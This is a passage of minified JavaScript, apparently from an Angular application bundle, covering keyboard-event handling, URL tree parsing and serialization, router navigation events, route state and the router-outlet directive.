this.manager.getZone().runOutsideAngular(()=>Vt().onAndCancel(n,o.domEventName,s))}static parseEventName(n){let r=n.toLowerCase().split("."),i=r.shift();if(r.length===0||!(i==="keydown"||i==="keyup"))return null;let o=t._normalizeKey(r.pop()),s="",a=r.indexOf("code");if(a>-1&&(r.splice(a,1),s="code."),By.forEach(l=>{let u=r.indexOf(l);u>-1&&(r.splice(u,1),s+=l+".")}),s+=o,r.length!=0||o.length===0)return null;let c={};return c.domEventName=i,c.fullKey=s,c}static matchEventFullKeyCode(n,r){let i=AA[n.key]||n.key,o="";return r.indexOf("code.")>-1&&(i=n.code,o="code."),i==null||!i?!1:(i=i.toLowerCase(),i===" "?i="space":i==="."&&(i="dot"),By.forEach(s=>{if(s!==i){let a=MA[s];a(n)&&(o+=s+".")}}),o+=i,o===r)}static eventCallback(n,r,i){return o=>{t.matchEventFullKeyCode(o,n)&&i.runGuarded(()=>r(o))}}static _normalizeKey(n){return n==="esc"?"escape":n}static{this.\u0275fac=function(r){return new(r||t)(N(ze))}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac})}}return t})();function Gy(t,e){return Ay(v({rootComponent:t},RA(e)))}function RA(t){return{appProviders:[...FA,...t?.providers??[]],platformProviders:kA}}function xA(){Td.makeCurrent()}function OA(){return new At}function PA(){return Lv(document),document}var kA=[{provide:hn,useValue:Vy},{provide:od,useValue:xA,multi:!0},{provide:ze,useFactory:PA,deps:[]}];var FA=[{provide:Ta,useValue:"root"},{provide:At,useFactory:OA,deps:[]},{provide:Ad,useClass:TA,multi:!0,deps:[ze,Y,hn]},{provide:Ad,useClass:NA,multi:!0,deps:[ze]},jy,Hy,$y,{provide:qr,useExisting:jy},{provide:$a,useClass:IA,deps:[]},[]];var qy=(()=>{class t{constructor(n){this._doc=n}getTitle(){return this._doc.title}setTitle(n){this._doc.title=n||""}static{this.\u0275fac=function(r){return new(r||t)(N(ze))}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"root"})}}return t})();var A="primary",Ao=Symbol("RouteTitle"),kd=class{constructor(e){this.params=e||{}}has(e){return Object.prototype.hasOwnProperty.call(this.params,e)}get(e){if(this.has(e)){let n=this.params[e];return Array.isArray(n)?n[0]:n}return null}getAll(e){if(this.has(e)){let n=this.params[e];return Array.isArray(n)?n:[n]}return[]}get keys(){return Object.keys(this.params)}};function oi(t){return new kd(t)}function jA(t,e,n){let r=n.path.split("/");if(r.length>t.length||n.pathMatch==="full"&&(e.hasChildren()||r.length<t.length))return null;let i={};for(let o=0;o<r.length;o++){let s=r[o],a=t[o];if(s[0]===":")i[s.substring(1)]=a;else if(s!==a.path)return null}return{consumed:t.slice(0,r.length),posParams:i}}function UA(t,e){if(t.length!==e.length)return!1;for(let n=0;n<t.length;++n)if(!vt(t[n],e[n]))return!1;return!0}function vt(t,e){let n=t?Fd(t):void 0,r=e?Fd(e):void 0;if(!n||!r||n.length!=r.length)return!1;let i;for(let o=0;o<n.length;o++)if(i=n[o],!t_(t[i],e[i]))return!1;return!0}function Fd(t){return[...Object.keys(t),...Object.getOwnPropertySymbols(t)]}function t_(t,e){if(Array.isArray(t)&&Array.isArray(e)){if(t.length!==e.length)return!1;let n=[...t].sort(),r=[...e].sort();return n.every((i,o)=>r[o]===i)}else return t===e}function n_(t){return t.length>0?t[t.length-1]:null}function gn(t){return Ll(t)?t:zn(t)?ie(Promise.resolve(t)):T(t)}var BA={exact:i_,subset:o_},r_={exact:$A,subset:HA,ignored:()=>!0};function Yy(t,e,n){return BA[n.paths](t.root,e.root,n.matrixParams)&&r_[n.queryParams](t.queryParams,e.queryParams)&&!(n.fragment==="exact"&&t.fragment!==e.fragment)}function $A(t,e){return vt(t,e)}function i_(t,e,n){if(!Kn(t.segments,e.segments)||!Ya(t.segments,e.segments,n)||t.numberOfChildren!==e.numberOfChildren)return!1;for(let r in e.children)if(!t.children[r]||!i_(t.children[r],e.children[r],n))return!1;return!0}function HA(t,e){return Object.keys(e).length<=Object.keys(t).length&&Object.keys(e).every(n=>t_(t[n],e[n]))}function o_(t,e,n){return s_(t,e,e.segments,n)}function s_(t,e,n,r){if(t.segments.length>n.length){let i=t.segments.slice(0,n.length);return!(!Kn(i,n)||e.hasChildren()||!Ya(i,n,r))}else if(t.segments.length===n.length){if(!Kn(t.segments,n)||!Ya(t.segments,n,r))return!1;for(let i in e.children)if(!t.children[i]||!o_(t.children[i],e.children[i],r))return!1;return!0}else{let i=n.slice(0,t.segments.length),o=n.slice(t.segments.length);return!Kn(t.segments,i)||!Ya(t.segments,i,r)||!t.children[A]?!1:s_(t.children[A],e,o,r)}}function Ya(t,e,n){return e.every((r,i)=>r_[n](t[i].parameters,r.parameters))}var Ut=class{constructor(e=new G([],{}),n={},r=null){this.root=e,this.queryParams=n,this.fragment=r}get queryParamMap(){return this._queryParamMap??=oi(this.queryParams),this._queryParamMap}toString(){return GA.serialize(this)}},G=class{constructor(e,n){this.segments=e,this.children=n,this.parent=null,Object.values(n).forEach(r=>r.parent=this)}hasChildren(){return this.numberOfChildren>0}get numberOfChildren(){return Object.keys(this.children).length}toString(){return Ka(this)}},Yn=class{constructor(e,n){this.path=e,this.parameters=n}get parameterMap(){return this._parameterMap??=oi(this.parameters),this._parameterMap}toString(){return c_(this)}};function WA(t,e){return Kn(t,e)&&t.every((n,r)=>vt(n.parameters,e[r].parameters))}function Kn(t,e){return t.length!==e.length?!1:t.every((n,r)=>n.path===e[r].path)}function zA(t,e){let n=[];return Object.entries(t.children).forEach(([r,i])=>{r===A&&(n=n.concat(e(i,r)))}),Object.entries(t.children).forEach(([r,i])=>{r!==A&&(n=n.concat(e(i,r)))}),n}var ch=(()=>{class t{static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:()=>new yo,providedIn:"root"})}}return t})(),yo=class{parse(e){let n=new Vd(e);return new Ut(n.parseRootSegment(),n.parseQueryParams(),n.parseFragment())}serialize(e){let n=`/${ho(e.root,!0)}`,r=KA(e.queryParams),i=typeof e.fragment=="string"?`#${qA(e.fragment)}`:"";return`${n}${r}${i}`}},GA=new yo;function Ka(t){return t.segments.map(e=>c_(e)).join("/")}function ho(t,e){if(!t.hasChildren())return Ka(t);if(e){let n=t.children[A]?ho(t.children[A],!1):"",r=[];return Object.entries(t.children).forEach(([i,o])=>{i!==A&&r.push(`${i}:${ho(o,!1)}`)}),r.length>0?`${n}(${r.join("//")})`:n}else{let n=zA(t,(r,i)=>i===A?[ho(t.children[A],!1)]:[`${i}:${ho(r,!1)}`]);return Object.keys(t.children).length===1&&t.children[A]!=null?`${Ka(t)}/${n[0]}`:`${Ka(t)}/(${n.join("//")})`}}function a_(t){return encodeURIComponent(t).replace(/%40/g,"@").replace(/%3A/gi,":").replace(/%24/g,"$").replace(/%2C/gi,",")}function Ga(t){return a_(t).replace(/%3B/gi,";")}function qA(t){return encodeURI(t)}function Ld(t){return a_(t).replace(/\(/g,"%28").replace(/\)/g,"%29").replace(/%26/gi,"&")}function Za(t){return decodeURIComponent(t)}function Ky(t){return Za(t.replace(/\+/g,"%20"))}function c_(t){return`${Ld(t.path)}${YA(t.parameters)}`}function YA(t){return Object.entries(t).map(([e,n])=>`;${Ld(e)}=${Ld(n)}`).join("")}function KA(t){let e=Object.entries(t).map(([n,r])=>Array.isArray(r)?r.map(i=>`${Ga(n)}=${Ga(i)}`).join("&"):`${Ga(n)}=${Ga(r)}`).filter(n=>n);return e.length?`?${e.join("&")}`:""}var ZA=/^[^\/()?;#]+/;function Rd(t){let e=t.match(ZA);return e?e[0]:""}var QA=/^[^\/()?;=#]+/;function JA(t){let e=t.match(QA);return e?e[0]:""}var XA=/^[^=?&#]+/;function eM(t){let e=t.match(XA);return e?e[0]:""}var tM=/^[^&#]+/;function nM(t){let e=t.match(tM);return e?e[0]:""}var Vd=class{constructor(e){this.url=e,this.remaining=e}parseRootSegment(){return this.consumeOptional("/"),this.remaining===""||this.peekStartsWith("?")||this.peekStartsWith("#")?new G([],{}):new G([],this.parseChildren())}parseQueryParams(){let e={};if(this.consumeOptional("?"))do this.parseQueryParam(e);while(this.consumeOptional("&"));return e}parseFragment(){return this.consumeOptional("#")?decodeURIComponent(this.remaining):null}parseChildren(){if(this.remaining==="")return{};this.consumeOptional("/");let e=[];for(this.peekStartsWith("(")||e.push(this.parseSegment());this.peekStartsWith("/")&&!this.peekStartsWith("//")&&!this.peekStartsWith("/(");)this.capture("/"),e.push(this.parseSegment());let n={};this.peekStartsWith("/(")&&(this.capture("/"),n=this.parseParens(!0));let r={};return this.peekStartsWith("(")&&(r=this.parseParens(!1)),(e.length>0||Object.keys(n).length>0)&&(r[A]=new G(e,n)),r}parseSegment(){let e=Rd(this.remaining);if(e===""&&this.peekStartsWith(";"))throw new w(4009,!1);return this.capture(e),new Yn(Za(e),this.parseMatrixParams())}parseMatrixParams(){let e={};for(;this.consumeOptional(";");)this.parseParam(e);return e}parseParam(e){let n=JA(this.remaining);if(!n)return;this.capture(n);let r="";if(this.consumeOptional("=")){let i=Rd(this.remaining);i&&(r=i,this.capture(r))}e[Za(n)]=Za(r)}parseQueryParam(e){let n=eM(this.remaining);if(!n)return;this.capture(n);let r="";if(this.consumeOptional("=")){let s=nM(this.remaining);s&&(r=s,this.capture(r))}let i=Ky(n),o=Ky(r);if(e.hasOwnProperty(i)){let s=e[i];Array.isArray(s)||(s=[s],e[i]=s),s.push(o)}else e[i]=o}parseParens(e){let n={};for(this.capture("(");!this.consumeOptional(")")&&this.remaining.length>0;){let r=Rd(this.remaining),i=this.remaining[r.length];if(i!=="/"&&i!==")"&&i!==";")throw new w(4010,!1);let o;r.indexOf(":")>-1?(o=r.slice(0,r.indexOf(":")),this.capture(o),this.capture(":")):e&&(o=A);let s=this.parseChildren();n[o]=Object.keys(s).length===1?s[A]:new G([],s),this.consumeOptional("//")}return n}peekStartsWith(e){return this.remaining.startsWith(e)}consumeOptional(e){return this.peekStartsWith(e)?(this.remaining=this.remaining.substring(e.length),!0):!1}capture(e){if(!this.consumeOptional(e))throw new w(4011,!1)}};function l_(t){return t.segments.length>0?new G([],{[A]:t}):t}function u_(t){let e={};for(let[r,i]of Object.entries(t.children)){let o=u_(i);if(r===A&&o.segments.length===0&&o.hasChildren())for(let[s,a]of Object.entries(o.children))e[s]=a;else(o.segments.length>0||o.hasChildren())&&(e[r]=o)}let n=new G(t.segments,e);return rM(n)}function rM(t){if(t.numberOfChildren===1&&t.children[A]){let e=t.children[A];return new G(t.segments.concat(e.segments),e.children)}return t}function _o(t){return t instanceof Ut}function iM(t,e,n=null,r=null){let i=d_(t);return h_(i,e,n,r)}function d_(t){let e;function n(o){let s={};for(let c of o.children){let l=n(c);s[c.outlet]=l}let a=new G(o.url,s);return o===t&&(e=a),a}let r=n(t.root),i=l_(r);return e??i}function h_(t,e,n,r){let i=t;for(;i.parent;)i=i.parent;if(e.length===0)return xd(i,i,i,n,r);let o=oM(e);if(o.toRoot())return xd(i,i,new G([],{}),n,r);let s=sM(o,i,t),a=s.processChildren?go(s.segmentGroup,s.index,o.commands):p_(s.segmentGroup,s.index,o.commands);return xd(i,s.segmentGroup,a,n,r)}function Qa(t){return typeof t=="object"&&t!=null&&!t.outlets&&!t.segmentPath}function Io(t){return typeof t=="object"&&t!=null&&t.outlets}function xd(t,e,n,r,i){let o={};r&&Object.entries(r).forEach(([c,l])=>{o[c]=Array.isArray(l)?l.map(u=>`${u}`):`${l}`});let s;t===e?s=n:s=f_(t,e,n);let a=l_(u_(s));return new Ut(a,o,i)}function f_(t,e,n){let r={};return Object.entries(t.children).forEach(([i,o])=>{o===e?r[i]=n:r[i]=f_(o,e,n)}),new G(t.segments,r)}var Ja=class{constructor(e,n,r){if(this.isAbsolute=e,this.numberOfDoubleDots=n,this.commands=r,e&&r.length>0&&Qa(r[0]))throw new w(4003,!1);let i=r.find(Io);if(i&&i!==n_(r))throw new w(4004,!1)}toRoot(){return this.isAbsolute&&this.commands.length===1&&this.commands[0]=="/"}};function oM(t){if(typeof t[0]=="string"&&t.length===1&&t[0]==="/")return new Ja(!0,0,t);let e=0,n=!1,r=t.reduce((i,o,s)=>{if(typeof o=="object"&&o!=null){if(o.outlets){let a={};return Object.entries(o.outlets).forEach(([c,l])=>{a[c]=typeof l=="string"?l.split("/"):l}),[...i,{outlets:a}]}if(o.segmentPath)return[...i,o.segmentPath]}return typeof o!="string"?[...i,o]:s===0?(o.split("/").forEach((a,c)=>{c==0&&a==="."||(c==0&&a===""?n=!0:a===".."?e++:a!=""&&i.push(a))}),i):[...i,o]},[]);return new Ja(n,e,r)}var ni=class{constructor(e,n,r){this.segmentGroup=e,this.processChildren=n,this.index=r}};function sM(t,e,n){if(t.isAbsolute)return new ni(e,!0,0);if(!n)return new ni(e,!1,NaN);if(n.parent===null)return new ni(n,!0,0);let r=Qa(t.commands[0])?0:1,i=n.segments.length-1+r;return aM(n,i,t.numberOfDoubleDots)}function aM(t,e,n){let r=t,i=e,o=n;for(;o>i;){if(o-=i,r=r.parent,!r)throw new w(4005,!1);i=r.segments.length}return new ni(r,!1,i-o)}function cM(t){return Io(t[0])?t[0].outlets:{[A]:t}}function p_(t,e,n){if(t??=new G([],{}),t.segments.length===0&&t.hasChildren())return go(t,e,n);let r=lM(t,e,n),i=n.slice(r.commandIndex);if(r.match&&r.pathIndex<t.segments.length){let o=new G(t.segments.slice(0,r.pathIndex),{});return o.children[A]=new G(t.segments.slice(r.pathIndex),t.children),go(o,0,i)}else return r.match&&i.length===0?new G(t.segments,{}):r.match&&!t.hasChildren()?jd(t,e,n):r.match?go(t,0,i):jd(t,e,n)}function go(t,e,n){if(n.length===0)return new G(t.segments,{});{let r=cM(n),i={};if(Object.keys(r).some(o=>o!==A)&&t.children[A]&&t.numberOfChildren===1&&t.children[A].segments.length===0){let o=go(t.children[A],e,n);return new G(t.segments,o.children)}return Object.entries(r).forEach(([o,s])=>{typeof s=="string"&&(s=[s]),s!==null&&(i[o]=p_(t.children[o],e,s))}),Object.entries(t.children).forEach(([o,s])=>{r[o]===void 0&&(i[o]=s)}),new G(t.segments,i)}}function lM(t,e,n){let r=0,i=e,o={match:!1,pathIndex:0,commandIndex:0};for(;i<t.segments.length;){if(r>=n.length)return o;let s=t.segments[i],a=n[r];if(Io(a))break;let c=`${a}`,l=r<n.length-1?n[r+1]:null;if(i>0&&c===void 0)break;if(c&&l&&typeof l=="object"&&l.outlets===void 0){if(!Qy(c,l,s))return o;r+=2}else{if(!Qy(c,{},s))return o;r++}i++}return{match:!0,pathIndex:i,commandIndex:r}}function jd(t,e,n){let r=t.segments.slice(0,e),i=0;for(;i<n.length;){let o=n[i];if(Io(o)){let c=uM(o.outlets);return new G(r,c)}if(i===0&&Qa(n[0])){let c=t.segments[e];r.push(new Yn(c.path,Zy(n[0]))),i++;continue}let s=Io(o)?o.outlets[A]:`${o}`,a=i<n.length-1?n[i+1]:null;s&&a&&Qa(a)?(r.push(new Yn(s,Zy(a))),i+=2):(r.push(new Yn(s,{})),i++)}return new G(r,{})}function uM(t){let e={};return Object.entries(t).forEach(([n,r])=>{typeof r=="string"&&(r=[r]),r!==null&&(e[n]=jd(new G([],{}),0,r))}),e}function Zy(t){let e={};return Object.entries(t).forEach(([n,r])=>e[n]=`${r}`),e}function Qy(t,e,n){return t==n.path&&vt(e,n.parameters)}var mo="imperative",ve=function(t){return t[t.NavigationStart=0]="NavigationStart",t[t.NavigationEnd=1]="NavigationEnd",t[t.NavigationCancel=2]="NavigationCancel",t[t.NavigationError=3]="NavigationError",t[t.RoutesRecognized=4]="RoutesRecognized",t[t.ResolveStart=5]="ResolveStart",t[t.ResolveEnd=6]="ResolveEnd",t[t.GuardsCheckStart=7]="GuardsCheckStart",t[t.GuardsCheckEnd=8]="GuardsCheckEnd",t[t.RouteConfigLoadStart=9]="RouteConfigLoadStart",t[t.RouteConfigLoadEnd=10]="RouteConfigLoadEnd",t[t.ChildActivationStart=11]="ChildActivationStart",t[t.ChildActivationEnd=12]="ChildActivationEnd",t[t.ActivationStart=13]="ActivationStart",t[t.ActivationEnd=14]="ActivationEnd",t[t.Scroll=15]="Scroll",t[t.NavigationSkipped=16]="NavigationSkipped",t}(ve||{}),Ge=class{constructor(e,n){this.id=e,this.url=n}},wo=class extends Ge{constructor(e,n,r="imperative",i=null){super(e,n),this.type=ve.NavigationStart,this.navigationTrigger=r,this.restoredState=i}toString(){return`NavigationStart(id: ${this.id}, url: '${this.url}')`}},Zn=class extends Ge{constructor(e,n,r){super(e,n),this.urlAfterRedirects=r,this.type=ve.NavigationEnd}toString(){return`NavigationEnd(id: ${this.id}, url: '${this.url}', urlAfterRedirects: '${this.urlAfterRedirects}')`}},Ve=function(t){return t[t.Redirect=0]="Redirect",t[t.SupersededByNewNavigation=1]="SupersededByNewNavigation",t[t.NoDataFromResolver=2]="NoDataFromResolver",t[t.GuardRejected=3]="GuardRejected",t}(Ve||{}),Ud=function(t){return t[t.IgnoredSameUrlNavigation=0]="IgnoredSameUrlNavigation",t[t.IgnoredByUrlHandlingStrategy=1]="IgnoredByUrlHandlingStrategy",t}(Ud||{}),jt=class extends Ge{constructor(e,n,r,i){super(e,n),this.reason=r,this.code=i,this.type=ve.NavigationCancel}toString(){return`NavigationCancel(id: ${this.id}, url: '${this.url}')`}},Qn=class extends Ge{constructor(e,n,r,i){super(e,n),this.reason=r,this.code=i,this.type=ve.NavigationSkipped}},Eo=class extends Ge{constructor(e,n,r,i){super(e,n),this.error=r,this.target=i,this.type=ve.NavigationError}toString(){return`NavigationError(id: ${this.id}, url: '${this.url}', error: ${this.error})`}},Xa=class extends Ge{constructor(e,n,r,i){super(e,n),this.urlAfterRedirects=r,this.state=i,this.type=ve.RoutesRecognized}toString(){return`RoutesRecognized(id: ${this.id}, url: '${this.url}', urlAfterRedirects: '${this.urlAfterRedirects}', state: ${this.state})`}},Bd=class extends Ge{constructor(e,n,r,i){super(e,n),this.urlAfterRedirects=r,this.state=i,this.type=ve.GuardsCheckStart}toString(){return`GuardsCheckStart(id: ${this.id}, url: '${this.url}', urlAfterRedirects: '${this.urlAfterRedirects}', state: ${this.state})`}},$d=class extends Ge{constructor(e,n,r,i,o){super(e,n),this.urlAfterRedirects=r,this.state=i,this.shouldActivate=o,this.type=ve.GuardsCheckEnd}toString(){return`GuardsCheckEnd(id: ${this.id}, url: '${this.url}', urlAfterRedirects: '${this.urlAfterRedirects}', state: ${this.state}, shouldActivate: ${this.shouldActivate})`}},Hd=class extends Ge{constructor(e,n,r,i){super(e,n),this.urlAfterRedirects=r,this.state=i,this.type=ve.ResolveStart}toString(){return`ResolveStart(id: ${this.id}, url: '${this.url}', urlAfterRedirects: '${this.urlAfterRedirects}', state: ${this.state})`}},Wd=class extends Ge{constructor(e,n,r,i){super(e,n),this.urlAfterRedirects=r,this.state=i,this.type=ve.ResolveEnd}toString(){return`ResolveEnd(id: ${this.id}, url: '${this.url}', urlAfterRedirects: '${this.urlAfterRedirects}', state: ${this.state})`}},zd=class{constructor(e){this.route=e,this.type=ve.RouteConfigLoadStart}toString(){return`RouteConfigLoadStart(path: ${this.route.path})`}},Gd=class{constructor(e){this.route=e,this.type=ve.RouteConfigLoadEnd}toString(){return`RouteConfigLoadEnd(path: ${this.route.path})`}},qd=class{constructor(e){this.snapshot=e,this.type=ve.ChildActivationStart}toString(){return`ChildActivationStart(path: '${this.snapshot.routeConfig&&this.snapshot.routeConfig.path||""}')`}},Yd=class{constructor(e){this.snapshot=e,this.type=ve.ChildActivationEnd}toString(){return`ChildActivationEnd(path: '${this.snapshot.routeConfig&&this.snapshot.routeConfig.path||""}')`}},Kd=class{constructor(e){this.snapshot=e,this.type=ve.ActivationStart}toString(){return`ActivationStart(path: '${this.snapshot.routeConfig&&this.snapshot.routeConfig.path||""}')`}},Zd=class{constructor(e){this.snapshot=e,this.type=ve.ActivationEnd}toString(){return`ActivationEnd(path: '${this.snapshot.routeConfig&&this.snapshot.routeConfig.path||""}')`}};var Co=class{},si=class{constructor(e,n){this.url=e,this.navigationBehaviorOptions=n}};function dM(t,e){return t.providers&&!t._injector&&(t._injector=yd(t.providers,e,`Route: ${t.path}`)),t._injector??e}function it(t){return t.outlet||A}function hM(t,e){let n=t.filter(r=>it(r)===e);return n.push(...t.filter(r=>it(r)!==e)),n}function Mo(t){if(!t)return null;if(t.routeConfig?._injector)return t.routeConfig._injector;for(let e=t.parent;e;e=e.parent){let n=e.routeConfig;if(n?._loadedInjector)return n._loadedInjector;if(n?._injector)return n._injector}return null}var Qd=class{get injector(){return Mo(this.route?.snapshot)??this.rootInjector}set injector(e){}constructor(e){this.rootInjector=e,this.outlet=null,this.route=null,this.children=new sc(this.rootInjector),this.attachRef=null}},sc=(()=>{class t{constructor(n){this.rootInjector=n,this.contexts=new Map}onChildOutletCreated(n,r){let i=this.getOrCreateContext(n);i.outlet=r,this.contexts.set(n,i)}onChildOutletDestroyed(n){let r=this.getContext(n);r&&(r.outlet=null,r.attachRef=null)}onOutletDeactivated(){let n=this.contexts;return this.contexts=new Map,n}onOutletReAttached(n){this.contexts=n}getOrCreateContext(n){let r=this.getContext(n);return r||(r=new Qd(this.rootInjector),this.contexts.set(n,r)),r}getContext(n){return this.contexts.get(n)||null}static{this.\u0275fac=function(r){return new(r||t)(N(He))}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"root"})}}return t})(),ec=class{constructor(e){this._root=e}get root(){return this._root.value}parent(e){let n=this.pathFromRoot(e);return n.length>1?n[n.length-2]:null}children(e){let n=Jd(e,this._root);return n?n.children.map(r=>r.value):[]}firstChild(e){let n=Jd(e,this._root);return n&&n.children.length>0?n.children[0].value:null}siblings(e){let n=Xd(e,this._root);return n.length<2?[]:n[n.length-2].children.map(i=>i.value).filter(i=>i!==e)}pathFromRoot(e){return Xd(e,this._root).map(n=>n.value)}};function Jd(t,e){if(t===e.value)return e;for(let n of e.children){let r=Jd(t,n);if(r)return r}return null}function Xd(t,e){if(t===e.value)return[e];for(let n of e.children){let r=Xd(t,n);if(r.length)return r.unshift(e),r}return[]}var Le=class{constructor(e,n){this.value=e,this.children=n}toString(){return`TreeNode(${this.value})`}};function ti(t){let e={};return t&&t.children.forEach(n=>e[n.value.outlet]=n),e}var tc=class extends ec{constructor(e,n){super(e),this.snapshot=n,lh(this,e)}toString(){return this.snapshot.toString()}};function g_(t){let e=fM(t),n=new ge([new Yn("",{})]),r=new ge({}),i=new ge({}),o=new ge({}),s=new ge(""),a=new ai(n,r,o,s,i,A,t,e.root);return a.snapshot=e.root,new tc(new Le(a,[]),e)}function fM(t){let e={},n={},r={},i="",o=new ri([],e,r,i,n,A,t,null,{});return new rc("",new Le(o,[]))}var ai=class{constructor(e,n,r,i,o,s,a,c){this.urlSubject=e,this.paramsSubject=n,this.queryParamsSubject=r,this.fragmentSubject=i,this.dataSubject=o,this.outlet=s,this.component=a,this._futureSnapshot=c,this.title=this.dataSubject?.pipe(O(l=>l[Ao]))??T(void 0),this.url=e,this.params=n,this.queryParams=r,this.fragment=i,this.data=o}get routeConfig(){return this._futureSnapshot.routeConfig}get root(){return this._routerState.root}get parent(){return this._routerState.parent(this)}get firstChild(){return this._routerState.firstChild(this)}get children(){return this._routerState.children(this)}get pathFromRoot(){return this._routerState.pathFromRoot(this)}get paramMap(){return this._paramMap??=this.params.pipe(O(e=>oi(e))),this._paramMap}get queryParamMap(){return this._queryParamMap??=this.queryParams.pipe(O(e=>oi(e))),this._queryParamMap}toString(){return this.snapshot?this.snapshot.toString():`Future(${this._futureSnapshot})`}};function nc(t,e,n="emptyOnly"){let r,{routeConfig:i}=t;return e!==null&&(n==="always"||i?.path===""||!e.component&&!e.routeConfig?.loadComponent)?r={params:v(v({},e.params),t.params),data:v(v({},e.data),t.data),resolve:v(v(v(v({},t.data),e.data),i?.data),t._resolvedData)}:r={params:v({},t.params),data:v({},t.data),resolve:v(v({},t.data),t._resolvedData??{})},i&&v_(i)&&(r.resolve[Ao]=i.title),r}var ri=class{get title(){return this.data?.[Ao]}constructor(e,n,r,i,o,s,a,c,l){this.url=e,this.params=n,this.queryParams=r,this.fragment=i,this.data=o,this.outlet=s,this.component=a,this.routeConfig=c,this._resolve=l}get root(){return this._routerState.root}get parent(){return this._routerState.parent(this)}get firstChild(){return this._routerState.firstChild(this)}get children(){return this._routerState.children(this)}get pathFromRoot(){return this._routerState.pathFromRoot(this)}get paramMap(){return this._paramMap??=oi(this.params),this._paramMap}get queryParamMap(){return this._queryParamMap??=oi(this.queryParams),this._queryParamMap}toString(){let e=this.url.map(r=>r.toString()).join("/"),n=this.routeConfig?this.routeConfig.path:"";return`Route(url:'${e}', path:'${n}')`}},rc=class extends ec{constructor(e,n){super(n),this.url=e,lh(this,n)}toString(){return m_(this._root)}};function lh(t,e){e.value._routerState=t,e.children.forEach(n=>lh(t,n))}function m_(t){let e=t.children.length>0?` { ${t.children.map(m_).join(", ")} } `:"";return`${t.value}${e}`}function Od(t){if(t.snapshot){let e=t.snapshot,n=t._futureSnapshot;t.snapshot=n,vt(e.queryParams,n.queryParams)||t.queryParamsSubject.next(n.queryParams),e.fragment!==n.fragment&&t.fragmentSubject.next(n.fragment),vt(e.params,n.params)||t.paramsSubject.next(n.params),UA(e.url,n.url)||t.urlSubject.next(n.url),vt(e.data,n.data)||t.dataSubject.next(n.data)}else t.snapshot=t._futureSnapshot,t.dataSubject.next(t._futureSnapshot.data)}function eh(t,e){let n=vt(t.params,e.params)&&WA(t.url,e.url),r=!t.parent!=!e.parent;return n&&!r&&(!t.parent||eh(t.parent,e.parent))}function v_(t){return typeof t.title=="string"||t.title===null}var uh=(()=>{class t{constructor(){this.activated=null,this._activatedRoute=null,this.name=A,this.activateEvents=new se,this.deactivateEvents=new se,this.attachEvents=new se,this.detachEvents=new se,this.parentContexts=y(sc),this.location=y(La),this.changeDetector=y(Xr),this.inputBinder=y(dh,{optional:!0}),this.supportsBindingToComponentInputs=!0}get activatedComponentRef(){return this.activated}ngOnChanges(n){if(n.name){let{firstChange:r,previousValue:i}=n.name;if(r)return;this.isTrackedInParentContexts(i)&&(this.deactivate(),this.parentContexts.onChildOutletDestroyed(i)),this.initializeOutletWithName()}}ngOnDestroy(){this.isTrackedInParentContexts(this.name)&&this.parentContexts.onChildOutletDestroyed(this.name),this.inputBinder?.unsubscribeFromRouteData(this)}isTrackedInParentContexts(n){return this.parentContexts.getContext(n)?.outlet===this}ngOnInit(){this.initializeOutletWithName()}initializeOutletWithName(){if(this.parentContexts.onChildOutletCreated(this.name,this),this.activated)return;let n=this.parentContexts.getContext(this.name);n?.route&&(n.attachRef?this.attach(n.attachRef,n.route):this.activateWith(n.route,n.injector))}get isActivated(){return!!this.activated}get component(){if(!this.activated)throw new w(4012,!1);return this.activated.instance}get activatedRoute(){if(!this.activated)throw new w(4012,!1);return this._activatedRoute}get activatedRouteData(){return this._activatedRoute?this._activatedRoute.snapshot.data:{}}detach(){if(!this.activated)throw new w(4012,!1);this.location.detach();let n=this.activated;return this.activated=null,this._activatedRoute=null,this.detachEvents.emit(n.instance),n}attach(n,r){this.activated=n,this._activatedRoute=r,this.location.insert(n.hostView),this.inputBinder?.bindActivatedRouteToOutletComponent(this),this.attachEvents.emit(n.instance)}deactivate(){if(this.activated){let n=this.component;this.activated.destroy(),this.activated=null,this._activatedRoute=null,this.deactivateEvents.emit(n)}}activateWith(n,r){if(this.isActivated)throw new w(4013,!1);this._activatedRoute=n;let i=this.location,s=n.snapshot.component,a=this.parentContexts.getOrCreateContext(this.name).children,c=new th(n,a,i.injector);this.activated=i.createComponent(s,{index:i.length,injector:c,environmentInjector:r}),this.changeDetector.markForCheck(),this.inputBinder?.bindActivatedRouteToOutletComponent(this),this.activateEvents.emit(this.activated.instance)}static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275dir=Ie({type:t,selectors:[["router-outlet"]],inputs:{name:"name"},outputs:{activateEvents:"activate",deactivateEvents:"deactivate",attachEvents:"attach",detachEvents:"detach"},exportAs:["outlet"],standalone:!0,features:[Hn]})}}return t})(),th=class t{__ngOutletInjector(e){return new t(this.route,this.childContexts,e)}constructor(e,n,r){this.route=e,this.childContexts=n,this.parent=r}get(e,n){return e===ai?this.route:e===sc?this.childContexts:this.parent.get(e,n)}},dh=new I("");function pM(t,e,n){let r=Do(t,e._root,n?n._root:void 0);return new tc(r,e)}function Do(t,e,n){if(n&&t.shouldReuseRoute(e.value,n.value.snapshot)){let r=n.value;r._futureSnapshot=e.value;let i=gM(t,e,n);return new Le(r,i)}else{if(t.shouldAttach(e.value)){let o=t.retrieve(e.value);if(o!==null){let s=o.route;return s.value._futureSnapshot=e.value,s.children=e.children.map(a=>Do(t,a)),s}}let r=mM(e.value),i=e.children.map(o=>Do(t,o));return new Le(r,i)}}function gM(t,e,n){return e.children.map(r=>{for(let i of n.children)if(t.shouldReuseRoute(r.value,i.value.snapshot))return Do(t,r,i);return Do(t,r)})}function mM(t){return new ai(new ge(t.url),new ge(t.params),new ge(t.queryParams),new ge(t.fragment),new ge(t.data),t.outlet,t.component,t)}var bo=class{constructor(e,n){this.redirectTo=e,this.navigationBehaviorOptions=n}},y_="ngNavigationCancelingError";function ic(t,e){let{redirectTo:n,navigationBehaviorOptions:r}=_o(e)?{redirectTo:e,navigationBehaviorOptions:void 0}:e,i=__(!1,Ve.Redirect);return i.url=n,i.navigationBehaviorOptions=r,i}function __(t,e){let n=new Error(`NavigationCancelingError: ${t||""}`);return n[y_]=!0,n.cancellationCode=e,n}function vM(t){return I_(t)&&_o(t.url)}function I_(t){return!!t&&t[y_]}var yM=(t,e,n,r)=>O(i=>(new 